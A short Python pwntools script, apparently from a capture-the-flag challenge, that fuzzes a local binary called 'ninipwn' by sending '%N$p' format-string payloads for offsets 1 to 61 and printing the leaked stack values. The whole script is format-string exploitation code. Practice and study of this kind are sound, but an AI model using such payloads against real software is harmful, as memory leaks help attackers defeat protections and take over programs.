from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./ninipwn', checksec=False)


# Let's fuzz 100 values
for i in range(1,62):
    try:
        p = process(level='error')
        p.recv()
        p.sendline(b'2')
        p.sendlineafter(b': ', '%{}$p'.format(i).encode())
        p.recvuntil(b'Key selected: ')
        result = p.recv().split(b'\n')
        result = result[0]
        leak_char = result.ljust(8,b"\x00")
        print(str(i) + ': ' + str(leak_char).strip())
        p.close()
    except EOFError:
        pass